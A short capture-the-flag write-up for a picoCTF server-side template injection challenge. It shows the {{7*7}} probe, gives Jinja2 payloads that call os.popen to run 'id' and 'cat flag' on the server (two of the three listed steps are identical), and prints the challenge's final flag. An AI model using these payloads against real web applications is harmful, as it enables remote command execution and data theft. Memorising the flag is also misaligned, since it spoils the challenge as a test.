
#### Description

I made a cool website where you can announce whatever you want! Try it out!

Additional details will be available after launching your challenge instance.

Server side template injection 

![](Pasted%20image%2020251206205632.png)

Since it is server side template injection it does not sanitize the user input it processes it 
![](Pasted%20image%2020251206205652.png)

we can check whether it is vulnerable to this SSTI we can pass {{7*7}}
which will execute in the backend without a check 
![](Pasted%20image%2020251206210051.png)
![](Pasted%20image%2020251206210101.png)


Since it does not validate the user input we can interact with the server with few command in python to reveal from server  follow this 3 steps 

1.{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}} 

2.{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

3.{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}

![](Pasted%20image%2020251206210524.png)

![](Pasted%20image%2020251206210825.png)

Final Flag : picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_9451989d}


